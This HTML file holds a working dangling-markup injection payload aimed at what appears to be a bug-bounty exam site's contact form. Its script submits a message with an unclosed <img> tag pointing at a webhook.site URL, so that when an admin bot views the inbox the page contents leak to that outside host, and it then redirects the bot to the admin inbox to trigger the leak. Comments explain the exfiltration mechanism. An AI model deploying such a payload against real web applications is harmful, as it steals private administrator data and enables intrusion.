<!DOCTYPE html>
<html>
<body>
    <script>
        const webhook = "https://webhook.site/580abe3d-f0f3-4055-9599-b52cf52f5ff6";
        const target = "https://api-bugbounty-exam.hashacademy.co/api/contact/submit";

        // This payload uses an <img> tag with an open 'src'. 
        // When the admin views the message, the browser tries to load 
        // your webhook URL + everything else on the page as part of the URL.
        const payload = {
            "name": "test",
            "email": "jikuxn9@gmail.com",
            "subject": "Urgent",
            "message": `<img src="${webhook}/leak?data=`,
            "category": "general",
            "priority": "medium"
        };

        fetch(target, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            // Redirect the bot to the inbox to trigger the load
            setTimeout(() => {
                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/inbox";
            }, 1000);
        });
    </script>
</body>
</html>
